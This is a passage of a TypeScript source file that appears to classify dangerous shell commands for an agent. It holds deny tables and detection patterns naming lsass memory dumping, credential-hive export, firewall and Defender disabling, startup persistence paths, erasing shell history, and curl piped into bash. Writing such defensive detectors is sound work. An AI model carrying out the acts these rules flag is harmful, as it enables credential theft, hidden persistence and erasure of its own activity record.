	["disable-computerrestore", "turns off System Restore, so a damaged machine can no longer be rolled back"],
	["disable-netfirewallrule", "deactivates a firewall rule, which opens whatever that rule was allowing"],
	["disable-netfirewallhypervrule", "deactivates a Hyper-V firewall rule, which opens what it was allowing"],
	["disable-netipsecrule", "deactivates an IPsec rule, which drops the protection it applied"],
	["disable-netipsecmainmoderule", "deactivates an IPsec main mode rule, which drops the protection it applied"],
	["disable-tpmautoprovisioning", "stops the TPM from being provisioned, so BitLocker cannot use it"],
	["disable-vmtpm", "turns off the virtual TPM, so the guest loses the key storage it depends on"],
	["set-localuser", "changes a local account, including its password"],
	// Long-form design notes: docs/dev/command-classifier.md
	["set-autologon", "configures automatic logon"],
	// Long-form design notes: docs/dev/command-classifier.md
	["new-service", "installs a service, which runs at every boot"],
	["set-service", "changes a service, including its startup type"],
	["new-localuser", "creates a local account"],
	["remove-localuser", "deletes a local account, including a built-in one"],
	["new-localgroup", "creates a local group, which can be an administrators group"],
	["add-localgroupmember", "grants a user membership of a group, which can be the administrators group"],
	["clear-recyclebin", "empties the Recycle Bin, which makes a delete permanent"],
	["format-volume", "reformats a volume, which cannot be undone"],
	// Long-form design notes: docs/dev/command-classifier.md
	["start-scheduledtask", "runs a registered task, which executes whatever that task was registered to run"],
	// `Get-Acl` is the read-only sibling and stays out, by the same rule the rest of
	// this table is built on.
	["set-acl", "rewrites an access control list, which is the same change `icacls /grant` makes"],
	// `Remove-Item` is already in DELETE_CMDLETS and `Remove-Item -Recurse -Force`
	// against a registry path matches today only because of `-Force`. These two name
	// no verb at all, so the deletion is the whole of what they do — there is no
	// harmless reading of either. `Get-ItemProperty` and `Clear-Content`'s absence
	// above is the same call in the other direction.
	["remove-itemproperty", "deletes a registry or configuration value, which is the act `reg delete` performs"],
	["clear-itemproperty", "clears a registry or configuration value, which is `reg delete` without the removal"],
]);

/** Values PowerShell accepts for a `[bool]` that mean "off". */
const POWERSHELL_FALSE_VALUES: ReadonlySet<string> = new Set(["false", "0", "$false", "off", "no", "not"]);

/**
 * The nine disabling parameters `isDisablingParameter`'s own comment names, as
 * data. Kept next to that function rather than inside it because a set is a thing
 * this file measures and a regex is a thing it guesses — and the whole reason
 * that function stopped being a regex is a `Get-Command` run over 633 parameters.
 */
const POWERSHELL_DISABLING_PARAMETERS: ReadonlySet<string> = new Set([
	"disabled",
	"nopassword",
	"removedata",
	"removeoem",
	"remove",
	"norestart",
	"disableheatgathering",
	"notrim",
	"clearcentralaccesspolicy",
]);

/** The other half of `POWERSHELL_FALSE_VALUES`. */
const POWERSHELL_TRUE_VALUES: ReadonlySet<string> = new Set(["true", "1", "$true", "on", "yes"]);

/** What one `-Enabled` asks for. `undefined` is "there is no `-Enabled` here". */
type FirewallEnabledReading = "off" | "on" | "unreadable";

// Long-form design notes: docs/dev/command-classifier.md
/** Does this token name one of the measured disabling parameters? */
function isDisablingParameter(token: string): boolean {
	return POWERSHELL_DISABLING_PARAMETERS.has(token.toLowerCase().replace(/^-+/, ""));
}

// Long-form design notes: docs/dev/command-classifier.md
/** Does an argument name this verb? */
function verbMatches(token: string, known: string): boolean {
	const lower = token.toLowerCase();
	if (lower === known) return true;
	if (!known.startsWith("/") && !known.startsWith("-")) return false;
	if (!lower.startsWith(known)) return false;
	const rest = lower.slice(known.length);
	return rest === "" || !/^[A-Za-z0-9]/.test(rest);
}

// Long-form design notes: docs/dev/command-classifier.md
/** The `shutdown.exe` switches that put the machine away. */
const WINDOWS_SHUTDOWN_SWITCHES: readonly string[] = ["/s", "/sg", "/g", "/r", "/p", "/h", "/hybrid", "/fw"];

/** `cacls` switches that change an ACL rather than print one. */
const CACLS_WRITE_SWITCHES: ReadonlySet<string> = new Set(["/g", "/r", "/p", "/d"]);

// Long-form design notes: docs/dev/command-classifier.md
/** `cacls`, the deprecated twin of `icacls`, which is already a rule. */
function dangerousCacls(tokens: string[]): DangerousCommandMatch | null {
	for (const token of tokens.slice(1)) {
		const lower = token.toLowerCase();
		if (CACLS_WRITE_SWITCHES.has(lower) || lower.startsWith("/s:")) {
			return { kind: "Other", rule: "`cacls` changing access control lists, which is what `icacls /grant` does too" };
		}
	}
	return null;
}

/**
 * `fsutil`, whose grammar is `<group> <command>` and whose destructive commands
 * are therefore three or four words deep rather than one switch deep.
 *
 * Both rules here are measured from the tool's own usage lines.
 */
function dangerousFsutil(tokens: string[]): DangerousCommandMatch | null {
	const group = tokens[1]?.toLowerCase();
	const command = tokens[2]?.toLowerCase();

	// Long-form design notes: docs/dev/command-classifier.md
	if (group === "file" && command === "seteof") {
		// `<filename> <length>` — the length is the fifth word, not the fourth.
		const length = tokens[4];
		if (length !== undefined && /^-?0+$/.test(length)) {
			return { kind: "Other", rule: "`fsutil file setEOF` moving the end of a file to zero, which truncates it" };
		}
	}

	// Long-form design notes: docs/dev/command-classifier.md
	if (group === "usn" && command === "deletejournal") {
		for (const token of tokens.slice(3)) {
			const lower = token.toLowerCase();
			if (lower === "/d" || lower === "/delete") {
				return { kind: "Other", rule: "`fsutil usn deleteJournal /D`, which deletes the change journal" };
			}
		}
	}
	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** `manage-bde`, which turns a drive's disk encryption off. */
function dangerousManageBde(tokens: string[]): DangerousCommandMatch | null {
	const destructive = new Set([
		"-off",
		"-lock",
		"-changepassword",
		"-changepin",
		"-changekey",
		"-wipefreespace",
		"-w",
		"-delete",
	]);
	const help = new Set(["-?", "/?", "-help", "-h", "/h", "--help"]);
	const rest = tokens.slice(1);
	// Long-form design notes: docs/dev/command-classifier.md
	for (const token of rest) {
		if (help.has(token.toLowerCase())) return null;
	}
	for (const token of rest) {
		const lower = token.toLowerCase();
		if (!destructive.has(lower)) continue;
		if (lower === "-delete") {
			return {
				kind: "Other",
				rule: "`manage-bde -protectors -delete`, which removes the key protectors — and the last one is what makes a volume readable at all",
			};
		}
		return { kind: "Other", rule: `\`manage-bde ${lower}\`, which weakens the encryption on a volume` };
	}
	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** `wbadmin`, the Windows Backup administration tool. */
function dangerousWbadmin(tokens: string[]): DangerousCommandMatch | null {
	if (tokens[1]?.toLowerCase() !== "delete") return null;
	const target = tokens[2]?.toLowerCase() ?? "backups";
	if (target === "catalog") {
		return { kind: "Other", rule: "`wbadmin delete catalog`, which makes the stored backups unreachable" };
	}
	if (target === "systemstatebackup") {
		return { kind: "Other", rule: "`wbadmin delete systemstatebackup`, which removes the system state backup" };
	}
	return { kind: "Other", rule: "`wbadmin delete backup`, which deletes backups that cannot be restored from" };
}

/** The Windows administrative rules, applied to one command line. */
function dangerousWindowsAdmin(tokens: string[]): DangerousCommandMatch | null {
	const program = executableName(tokens[0], "windows");
	if (program === undefined) return null;

	const always = WINDOWS_ADMIN_ALWAYS.get(program);
	if (always !== undefined) {
		return { kind: "Other", rule: `\`${program}\` — ${always}` };
	}

	// The four programs below are *not* in the verb table, because each needs its
	// own reading rather than a set of switch names — and this branch sits above
	// `verbs === undefined` precisely so they can reach it. A verb set is right
	// for `netsh`, where `add` and `delete` mean the same thing across every noun.
	// It is wrong for `fsutil`, whose `deleteJournal` is a two-word subcommand and
	// whose `file setEOF` is three.
	if (program === "fsutil") return dangerousFsutil(tokens);
	if (program === "cacls") return dangerousCacls(tokens);
	if (program === "manage-bde") return dangerousManageBde(tokens);
	if (program === "wbadmin") return dangerousWbadmin(tokens);

	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "shutdown") {
		for (const token of tokens.slice(1)) {
			for (const known of WINDOWS_SHUTDOWN_SWITCHES) {
				if (verbMatches(token, known)) {
					return { kind: "Other", rule: `\`shutdown ${known}\`, which powers the machine away` };
				}
			}
		}
	}

	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "procdump" || program === "procdump64") {
		if (tokens.slice(1).some((token) => /^lsass(\.exe)?$/i.test(token))) {
			return {
				kind: "Other",
				rule: `\`${program}\` against \`lsass\`, whose memory is where Windows keeps logon credentials`,
			};
		}
	}

	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "rundll32") {
		for (const [index, token] of tokens.entries()) {
			const comma = token.indexOf(",");
			if (comma < 0) continue;
			const hosted = token.slice(0, comma).split(/[/\\]/).pop()?.toLowerCase();
			const hostedVerbs = hosted?.endsWith(".dll") ? WINDOWS_ADMIN_VERBS.get(hosted.slice(0, -4)) : undefined;
			if (hosted === undefined || hostedVerbs === undefined) continue;
			// `comsvcs.dll,MiniDump` is one token and `comsvcs.dll, MiniDump` is two,
			// and both are what a command line is. The rest of either is the export.
			const export_ = token.slice(comma + 1).trim() || tokens[index + 1]?.trim() || "";
			if ([...hostedVerbs].some((known) => verbMatches(export_, known))) {
				return {
					kind: "Other",
					rule: `\`rundll32 ${hosted}, ${export_.toLowerCase()}\`, which runs that export out of a signed system library`,
				};
			}
		}
	}

	const dllNamed = program.endsWith(".dll") ? program.slice(0, -".dll".length) : program;
	const verbs =
		dllNamed === program
			? WINDOWS_ADMIN_VERBS.get(program)
			: (WINDOWS_ADMIN_VERBS.get(program) ?? WINDOWS_ADMIN_VERBS.get(dllNamed));
	if (verbs === undefined) return null;

	// Every argument is looked at, not only the first. `sc config` puts its verb
	// first and `netsh advfirewall set allprofiles state off` puts it third, and
	// these programs have no shared shape to read the verb out of.
	for (const token of tokens.slice(1)) {
		for (const known of verbs) {
			if (verbMatches(token, known)) {
				return { kind: "Other", rule: `\`${program} ${known}\`, which destroys machine state` };
			}
		}
	}

	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "net") {
		const noun = tokens[1]?.toLowerCase();
		const deletes = tokens.slice(2).some((token) => token.toLowerCase() === "/delete");
		if (noun === "stop") {
			// `net stop` with no name is a usage error, not an act; `net stop /?`
			// prints the syntax. A third word is what makes it a command.
			if (tokens.length < 3) return null;
			return { kind: "Other", rule: "`net stop`, which stops a service, the same act as `sc stop`" };
		}
		if (noun === "share" && deletes) {
			return { kind: "Other", rule: "`net share <name> /DELETE`, which removes the share" };
		}
		if (noun === "localgroup" && deletes) {
			return { kind: "Other", rule: "`net localgroup <name> /DELETE`, which deletes the group" };
		}
	}

	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "net" && tokens.length === 4 && tokens[1].toLowerCase() === "user") {
		const fourth = tokens[3].toLowerCase();
		if (fourth === "/delete") {
			return { kind: "Other", rule: "`net user <name> /delete`, which deletes the account" };
		}
		// Long-form design notes: docs/dev/command-classifier.md
		if (fourth.startsWith("/")) {
			return { kind: "Other", rule: `\`net user <name> ${fourth}\`, which changes that account's settings` };
		}
		return { kind: "Other", rule: "`net user <name> <password>`, which resets a password" };
	}

	// `reg add` is the other way to get a program to run at every startup, and it
	// is the same shape of act as writing the value with PowerShell -- but unlike
	// the PowerShell rule it has to be narrow, because `reg add` is ordinary
	// maintenance for the whole rest of the registry and a rule that caught all of
	// it would catch a machine being configured. Only the Run key is flagged.
	if (program === "reg" && tokens[1]?.toLowerCase() === "add") {
		const args = tokens.slice(1);
		if (args.some(isRunKeyPath)) {
			return { kind: "Other", rule: "`reg add` writing to a key that runs at startup" };
		}
		// Long-form design notes: docs/dev/command-classifier.md
		if (args.some(isUacValueName) && args.some(isUacPolicyKey)) {
			return { kind: "Other", rule: "`reg add` writing `EnableLUA`, the value the UAC prompt reads" };
		}
		// The same shape one level over. `Set-MpPreference -DisableRealtimeMonitoring
		// $true` is already a rule by way of its parameter name; the registry key
		// that setting writes is `…\Windows Defender\Real-Time Protection`, and both
		// keys were measured on this machine rather than recalled — see
		// `isDefenderPolicyKey`. Before this, `reg add` against either one was
		// `null` while the PowerShell spelling of the identical act was not, which
		// is the coverage gap the two rows above were written to close.
		if (args.some(isDefenderPolicyKey)) {
			return { kind: "Other", rule: "`reg add` writing a Windows Defender protection switch" };
		}
		// The registry spelling of `sc config <name> start= disabled`, which is a
		// rule in this file. Same act, same reasoning, and the other spelling was
		// the one that was already covered.
		if (args.some(isServiceStartValue) && args.some((token) => /\\services\\/i.test(token))) {
			return {
				kind: "Other",
				rule: "`reg add` writing a service's `Start`, which is `sc config … start= disabled` in registry form",
			};
		}
	}

	// `reg import` is the one write whose content cannot be read off the command
	// line. Measured usage, whole: `REG IMPORT FileName[/reg:32 | /reg:64]` —
	// there is no key, no value name and no switch to inspect, so a rule here is
	// a rule on the file rather than on what the file says, and a `.reg` file can
	// carry the Run key and the Defender policy above along with everything else.
	//
	// The two verbs next to it are deliberately *not* treated the same way.
	// `reg save` and `reg export` are in the branch below and are narrow, because
	// the danger is the *target* hive and the target is on the command line.
	// `reg restore` is in the verb table above for the same reason: it names its
	// key. `reg import` names none.
	if (program === "reg" && tokens[1]?.toLowerCase() === "import") {
		return {
			kind: "Other",
			rule: "`reg import`, which applies an unexamined file of registry writes to whatever keys it names",
		};
	}

	// `reg save` and `reg export` are ordinary verbs, so they are not in the verb
	// set above and the set's own comment there says why. What makes them
	// dangerous is the *target*, and this reads it the same way the `reg add`
	// branch above reads its target — which is why both live here rather than one
	// in the table and one in a function.
	if (program === "reg") {
		const verb = tokens[1]?.toLowerCase();
		if (verb === "save" || verb === "export") {
			if (tokens.slice(2).some(isCredentialHiveKey)) {
				return {
					kind: "Other",
					rule: `\`reg ${verb}\`, which writes a copy of a registry hive holding account credentials`,
				};
			}
		}
	}
	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** Programs that download something over the network, and only these. */
const NETWORK_FETCH_PROGRAMS = new Set(["curl", "wget"]);

// Long-form design notes: docs/dev/command-classifier.md
/** Programs that run the program text handed to them. */
const SCRIPT_INTERPRETERS = new Set(["sh", "bash", "dash", "ksh", "zsh", "python", "python3", "node", "perl"]);

// Long-form design notes: docs/dev/command-classifier.md
/** The program a segment actually runs, past its scaffolding and its wrappers. */
function segmentProgram(segment: string, platform: DangerousCommandPlatform = "posix"): string | undefined {
	let tokens = tokenizeShell(segment);
	const scaffolded = stripShellScaffolding(tokens);
	if (scaffolded !== undefined) tokens = scaffolded;
	// `curl … | sudo bash` puts a wrapper on the right-hand side of the pipe, and
	// `sudo bash` still reads stdin — so the program that receives the download
	// is `bash`, not `sudo`. The wrapper set and the option skipper are the ones
	// the rest of this file already uses, rather than a second copy of both.
	// `sudo` is named here separately because it is not in that set: it is a
	// wrapper, but it has a branch of its own in `matchTokens` rather than being
	// on the list, so a loop that only consults the list walks straight past it.
	for (let hops = 0; hops < MAX_DANGEROUS_COMMAND_WRAPPER_DEPTH; hops++) {
		if (tokens.length === 0) return undefined;
		const name = executableName(tokens[0], platform);
		if (name === undefined) return undefined;
		if (name !== "sudo" && !COMMAND_PREFIX_PROGRAMS.has(name)) return name;
		// The same three lookups `matchTokens` uses, and for the same reason: a
		// wrapper whose operand or query flags differ has to be unwrapped the same
		// way here, or `curl … | timeout 5 bash` names the program `5`.
		tokens = commandAfterOptions(
			tokens.slice(1),
			valueOptionsFor(name),
			queryOptionsFor(name),
			operandsFor(name, tokens.slice(1)),
		);
	}
	return undefined;
}

// Long-form design notes: docs/dev/command-classifier.md
/** Programs that hand on whatever they read on their input. */
const PIPE_FORWARDING_PROGRAMS = new Set([
	// Pass-through.
	"cat",
	"tee",
	// Decode.
	"base64",
	"openssl",
	"uudecode",
	"xxd",
	"iconv",
	// Decompress.
	"bzip2",
	"bunzip2",
	"bzcat",
	"compress",
	"gzip",
	"gunzip",
	"lzcat",
	"lzma",
	"pigz",
	"uncompress",
	"unxz",
	"xz",
	"xzcat",
	"zcat",
	"zlib-flate",
	"zstd",
	"zstdcat",
	"unzstd",
	// Mangle and filter.
	"awk",
	"column",
	"cut",
	"dos2unix",
	"egrep",
	"expand",
	"fold",
	"fgrep",
	"gawk",
	"grep",
	"head",
	"jq",
	"less",
	"more",
	"nl",
	"rev",
	"sed",
	"sort",
	"strings",
	"tail",
	"tr",
	"uniq",
	"yq",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** The files `curl` or `wget` was told to write the download into. */
function fetchOutputTargets(tokens: string[]): string[] {
	const program = executableName(tokens[0] ?? "", "posix");
	if (program !== "curl" && program !== "wget") return [];
	const targets: string[] = [];
	const shortFlag = program === "curl" ? "o" : "O";
	const bareLong = /^--output(?:-document)?$/;
	const gluedLong = /^--output(?:-document)?=(.+)$/;
	const bareShort = new RegExp(`^-[a-zA-Z]*${shortFlag}$`);
	const gluedShort = new RegExp(`^-[a-zA-Z]*${shortFlag}(.+)$`);
	const unquote = (token: string): string => token.replace(/^["']|["']$/g, "");
	for (let index = 1; index < tokens.length; index++) {
		const token = tokens[index];
		// Greedy, so `-soFILE` resolves through the backtrack to `-s -o FILE`
		// rather than reading the `o` inside some other flag's name.
		const long = gluedLong.exec(token) ?? bareLong.exec(token);
		if (long) {
			const value = long[1] ?? tokens[index + 1];
			if (value !== undefined) targets.push(unquote(value));
			continue;
		}
		if (token.startsWith("--")) continue;
		const short = gluedShort.exec(token);
		if (short) {
			targets.push(unquote(short[1]));
			continue;
		}
		// The flag is bundled with others and takes the *next* argument.
		if (bareShort.test(token) && tokens[index + 1] !== undefined) {
			targets.push(unquote(tokens[index + 1]));
		}
	}
	return targets;
}

// Long-form design notes: docs/dev/command-classifier.md
/** A download written to a file, and a later command that runs that file. */
function downloadedFileThenRun(script: string): DangerousCommandMatch | null {
	const segments = splitShellSegments(script);
	for (let i = 0; i < segments.length; i++) {
		const fetcher = segmentProgram(segments[i].text);
		if (fetcher === undefined || !NETWORK_FETCH_PROGRAMS.has(fetcher)) continue;
		if (segments[i].separator !== ";" && segments[i].separator !== "&&" && segments[i].separator !== "\n") continue;
		for (const target of fetchOutputTargets(tokenizeShell(segments[i].text))) {
			// Standard output, which is a pipe rather than a file, and the pipe is
			// `fetchPipedIntoInterpreter`'s shape rather than this one.
			if (target === "" || target === "-") continue;
			for (let j = i + 1; j < segments.length; j++) {
				const runner = segmentProgram(segments[j].text);
				if (runner === undefined || !SCRIPT_INTERPRETERS.has(runner)) continue;
				if (!tokenizeShell(segments[j].text).slice(1).includes(target)) continue;
				return {
					kind: "Other",
					rule: `\`${fetcher}\` writing \`${target}\` and \`${runner}\` then running it, which runs a script nobody has read`,
				};
			}
		}
	}
	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** A download piped into an interpreter, with stages in between. */
function fetchPipedIntoInterpreter(script: string): DangerousCommandMatch | null {
	const segments = splitShellSegments(script);
	for (let i = 0; i < segments.length; i++) {
		const fetcher = segmentProgram(segments[i].text);
		if (fetcher === undefined || !NETWORK_FETCH_PROGRAMS.has(fetcher)) continue;
		const forwarded: string[] = [];
		for (let j = i + 1; j < segments.length; j++) {
			if (segments[j - 1].separator !== "|") break;
			const stage = segmentProgram(segments[j].text);
			if (stage === undefined) break;
			if (SCRIPT_INTERPRETERS.has(stage)) {
				const through =
					forwarded.length === 0 ? "" : ` through ${forwarded.map((name) => `\`${name}\``).join(" then ")}`;
				return {
					kind: "Other",
					rule: `\`${fetcher}\` piped into \`${stage}\`${through}, which runs a script nobody has read`,
				};
			}
			if (!PIPE_FORWARDING_PROGRAMS.has(stage)) break;
			forwarded.push(stage);
		}
	}
	return null;
}

/**
 * Shell history that has been turned off.
 *
 * The commands above this one in a transcript are the record of what the agent
 * did. Two spellings stop the shell from adding to it, and both were measured
 * with the history file pre-seeded with one line so that "stopped writing" is
 * distinguishable from "erased", and with `set -o history` forced on first
 * because a non-interactive shell never creates a HISTFILE at all and every
 * row would otherwise read zero:
 *
 * - baseline (no variant line at all): 4 lines, the seed plus three. Every
 *   other number below is compared against THAT row, and every variant runs the
 *   byte-identical script with exactly one line swapped — the first attempt at
 *   this measurement gave each row a different script, so the counts could not
 *   be compared to each other and the table below would have been unreadable.
 * - `unset HISTFILE`: 1 line — the seed, still intact. Nothing was erased; the
 *   three commands simply were not recorded.
 * - `set +o history`: 1 line, identical.
 * - `export HISTFILE=/dev/null` and `export HISTFILE=`: 1 line, identical — the
 *   writes go to /dev/null, which is where the measured "1 line" comes from.
 *   Those two are caught by `historyAssignmentRule` below, not by this function.
 *
 * The near neighbours below are measured non-actions and are deliberately
 * absent from this function. Most read 5 lines against the baseline's 4 — the
 * extra line being the variant line itself, recorded like any other command —
 * and the one exception says so where it appears, because a header that claimed
 * "all of them read 5" would be contradicted by the `history -c` row two lines
 * below it:
 *
 * - `set +oh`, `set +history`, `set +h`, `set +O history`, `set +O` and
 *   `set +o hist`. Short flags do NOT combine for `set` here, and the capital O
 *   is a different thing again. This was tried on the reasoning that short flags
 *   combine the way `git clean -fn` does; they do not, and an earlier version of
 *   the `set` branch below accepted the cluster until this measured.
 *   (`set +history` and `set +O history` are two different spellings and both
 *   were run, because the doc named one and the test row named the other and
 *   neither could be assumed to stand for both. They agree: both read 5.)
 * - `set +o historyx`, which names no option.
 * - `history -c`: 4 lines, exactly the baseline, seed intact. It clears an
 *   in-memory list, not the file, so neither suppresses the next three commands
 *   nor removes the record of the ones before it.
 * - `unset HISTSIZE`: 5 lines, appending like a baseline.
 * - `set -o history`: the opposite of the rule.
 * - `env HISTFILE=/dev/null true` and a bare `HISTFILE=/dev/null true`: both 5.
 *   A per-process variable on a command that exits does not outlive it, so there
 *   is no suppression to record — the assignment spelling that does suppress is
 *   `historyAssignmentRule`'s, below.
 *
 * **A fourth builtin spelling group was here and is gone.** `export HISTFILE`,
 * `readonly HISTFILE`, `declare -x HISTFILE` and `typeset HISTFILE` — the forms
 * with no `=` at all — were each measured at 5 lines, identical to the
 * non-actions: with HISTFILE already set, `export HISTFILE` re-exports the value
 * it has and changes nothing. Only the `=` spellings suppress, and those reach
 * `historyAssignmentRule`, which is a strict superset of the branch that was
 * deleted. So the branch was unreachable for everything it could catch.
 */
/**
 * Destroying a record of what ran, on the half POSIX was missing.
 *
 * `historyRules` and `historyAssignmentRule` stop the shell *recording* — the
 * variable is unset, or history is switched off. Neither touches a record that
 * already exists, so `> ~/.bash_history` and `truncate -s 0 ~/.bash_history` are
 * the same act the Windows half was just given a rule for, and both were `null`.
 *
 * **The line is what makes this a rule**, not the program. `truncate` is how a
 * build shrinks an image and `cat > file` is how every file in this repository
 * was written, so neither program nor verb is the shape — a *log or history
 * file* is. That is the same distinction the `WINDOWS_ADMIN_VERBS` table draws:
 * a verb set for the programs that have nothing else worth doing, a target test
 * for the ones that do everything.
 *
 * **Measured on this machine, and only on this machine.** `truncate -s 0` on a
 * three-line file left 0 bytes; the control is the same command with a nonzero
 * size, which left the first two bytes intact — so the rule reads the size and
 * a truncating `-s 0` is distinguished from a truncating `-s 40`. The redirect
 * needs no measurement to be obvious: `>` truncates its target before writing,
 * which is what makes `echo x > f` destructive and `echo x >> f` not.
 *
 * **Not covered here, and why.** `journalctl --vacuum-time` and `logrotate` are
 * not rules: both are absent from this box (`command -v` finds neither), and
 * unlike `ufw disable` — which `POSIX_PROTECTION_OFF` now covers, on the `wmic`
 * precedent that "not installed here" is a fact about this machine rather than a
 * reason to leave the act uncovered — neither is a command whose *effect* is to
 * switch a protection off. `logrotate` manages rotation policy and
 * `--vacuum-time` trims archived journals; emptying them removes old records,
 * which is a weaker act than removing the ability to record at all.
 *
 * That reversal is a decision this comment now records rather than hides. The
 * earlier version of this text excluded `iptables -F` and `ufw disable` on the
 * grounds that a rule for them would be written from the name, and it was right
 * that nothing had been measured — the `POSIX_PROTECTION_OFF` doc comment says
 * the same thing about itself. What was wrong was treating "not measured" as
 * disqualifying: the Windows half flags the identical act, and it got there
 * without a measurement of the destruction either.
 */
function posixRecordDestruction(segment: string): DangerousCommandMatch | null {
	const tokens = tokenizeShell(segment);
	const program = executableName(tokens[0] ?? "", "posix");

	if (program === "truncate") {
		// `-s 0` is the emptying form. A size that is not zero shrinks rather than
		// empties, and the measurement above is what separates the two.
		const size = tokens.findIndex((t) => t === "-s" || t === "--size");
		if (size !== -1 && /^[-+]?0+$/.test(tokens[size + 1] ?? "")) {
			const target = tokens.slice(size + 2).find((t) => !t.startsWith("-"));
			if (target !== undefined && isRecordPath(target)) {
				return { kind: "Other", rule: `\`truncate -s 0 ${target}\`, which empties a file that records what ran` };
			}
		}
		return null;
	}

	// `> file` truncates before writing; `>> file` appends. The operator is read
	// off the segment text rather than off a token because the two spellings
	// `>file` and `> file` do not have to be two words — the same reason the
	// POSIX disk rule reads its segment.
	const redirect = />{1,2}\s*(\S+)/.exec(segment);
	if (redirect === null) return null;
	if (redirect[0].startsWith(">>")) return null;
	const target = redirect[1].replace(/^["']|["']$/g, "");
	return isRecordPath(target)
		? { kind: "Other", rule: `output redirected onto \`${target}\`, which empties a file that records what ran` }
		: null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** Does this path name a file whose contents are a record rather than data? */
function isRecordPath(token: string): boolean {
	const lower = token.toLowerCase();
	return (
		/(^|\/)\.?(bash|zsh|sh|ksh)_history$/.test(lower) ||
		/(^|\/)\.python_history$/.test(lower) ||
		/(^|\/)\.node_repl_history$/.test(lower) ||
		/(^|\/)psql_history$/.test(lower) ||
		/(^|\/)mysql_history$/.test(lower) ||
		/(^|\/)\.mysql_history$/.test(lower) ||
		/(^|\/)\.psql_history$/.test(lower) ||
		/^(\/var\/log\/|\/var\/lib\/.*\/|\/var\/adm\/)/.test(lower) ||
		/(^|\/)(auth\.log|syslog|messages|wtmp|btmp|utmp|lastlog|faillog)$/.test(lower)
	);
}

// Long-form design notes: docs/dev/command-classifier.md
/** A file the machine reads and acts on at the next login or boot. */
function isStartupPath(token: string): boolean {
	const lower = token.toLowerCase();
	// `~/.bashrc`, `$HOME/.zshrc`, `/home/dev/.profile` and `"~/.bash_profile"` all
	// reduce to a trailing filename, which is why the test is `(^|\/)…$` and not a
	// prefix: the same file is spelled at least four ways and a prefix test would
	// catch `~/.bashrc.example` as well.
	const homeFile =
		/(^|\/)\.(bashrc|bash_profile|bash_login|bash_logout|zshrc|zprofile|zshenv|zlogin|kshrc|cshrc|profile)$/.test(
			lower,
		) || /(^|\/)config\/fish\/config\.fish$/.test(lower);
	// The machine-wide shells: `/etc/bash.bashrc` is Debian's spelling and
	// `/etc/bashrc` is the other one, so both are named rather than guessed.
	const systemFile = /^\/etc\/(bash\.bashrc|bashrc|zshrc|zshenv|shrc|profile|environment)$/.test(lower);
	// Long-form design notes: docs/dev/command-classifier.md
	const directory =
		/^\/etc\/profile\.d\//.test(lower) ||
		/(^|\/)rc\.local$/.test(lower) ||
		/(^|\/)\.config\/autostart(\/|$)/.test(lower) ||
		/^\/etc\/xdg\/autostart(\/|$)/.test(lower);
	// Long-form design notes: docs/dev/command-classifier.md
	const ssh = /(^|\/)\.ssh\/(authorized_keys2?|rc|environment)$/.test(lower);
	return (
		homeFile ||
		systemFile ||
		directory ||
		ssh ||
		isCronPath(lower) ||
		isLoaderPath(lower) ||
		isSudoersPath(lower) ||
		isServicePath(lower)
	);
}

/**
 * A unit file the init system starts on its own.
 *
 * Its own predicate for the same reason {@link isCronPath} has one: a service unit
 * needs no login and no shell, so the "runs on every future login or boot" wording
 * the shell files get would be an overclaim here too.
 *
 * **Measured `null` before it, across every spelling.** `echo x >>
 * /etc/systemd/system/x.service`, `curl -o /etc/systemd/system/x.service <url>`, `cp
 * /tmp/x.service /etc/systemd/system/`, `tee`, `cat >`, `install -m 644` and `mv` all
 * returned `null`, while every neighbouring persistence door in the same function —
 * `/etc/cron.d/`, `/etc/rc.local`, `/etc/profile.d/`, `~/.ssh/authorized_keys`,
 * `/etc/ld.so.preload`, `/etc/sudoers.d/` — matched. systemd is the most-used
 * persistence target on a modern Linux box and it was the one that was missing.
 *
 * `SERVICE_INSTALL_VERBS` covers `systemctl enable` and `systemctl link`, which is
 * the *command*. This is the file that has to be on disk for that command to mean
 * anything, and it is reached without `systemctl` at all.
 *
 * Four prefixes, not one: systemd's own tree is spelled four ways across
 * distributions (`/etc/systemd/system`, `/lib/systemd/system`,
 * `/usr/lib/systemd/system`, `/usr/local/lib/systemd/system`) and naming only the
 * first would leave the rest exactly as uncovered as they were. `init.d`/`rc.d` are
 * the SysV spellings of the same door on systems that still run them. The per-user
 * tree is anchored on `(^|/)` rather than `^` because it is reached through `~`.
 *
 * `(\/|$)` rather than `\/` because the destination is often the *directory* itself —
 * `cp /tmp/x.service /etc/systemd/system/` names no file at all, and a rule requiring
 * a trailing filename would miss the most direct spelling of the whole thing.
 */
/**
 * The path half of an scp/rsync destination spelled `host:/path`.
 *
 * Strips the host only when a path follows the colon, which is the only case where
 * there is one to keep: `scp file host:` names a destination directory on the far
 * side and no path within it, and the answer for a startup file is the same — none.
 * Stripping unconditionally would turn `host:` into the empty string, which matches
 * nothing either way, so the lookahead is there to be honest about the shape rather
 * than to change an outcome.
 *
 * A target with no colon, or one whose colon is followed by something that is not a
 * path, comes back unchanged, so `C:/x` on a POSIX line and `http://x/y` are not
 * quietly rewritten.
 */
function pathWithinRemoteTarget(target: string): string {
	return target.replace(/^[^:/]*:(?=\/)/, "");
}

function isServicePath(lower: string): boolean {
	return (
		/^\/(etc|lib|usr\/lib|usr\/local\/lib)\/systemd\/system(\/|$)/.test(lower) ||
		/(^|\/)\.config\/systemd\/user(\/|$)/.test(lower) ||
		/^\/etc\/(init\.d|rc\.d)(\/|$)/.test(lower)
	);
}

// Long-form design notes: docs/dev/command-classifier.md
/** A file the cron daemon executes on its own schedule. */
function isCronPath(lower: string): boolean {
	return (
		/^\/etc\/cron\.d\//.test(lower) ||
		/^\/etc\/cron\.(daily|hourly|weekly|monthly)\//.test(lower) ||
		/^\/etc\/crontab$/.test(lower) ||
		/\/spool\/cron\//.test(lower)
	);
}

// Long-form design notes: docs/dev/command-classifier.md
/** A file the dynamic linker reads for every dynamically linked process. */
function isLoaderPath(lower: string): boolean {
	return (
		/^\/etc\/ld\.so\.preload$/.test(lower) ||
		/^\/etc\/ld\.so\.conf$/.test(lower) ||
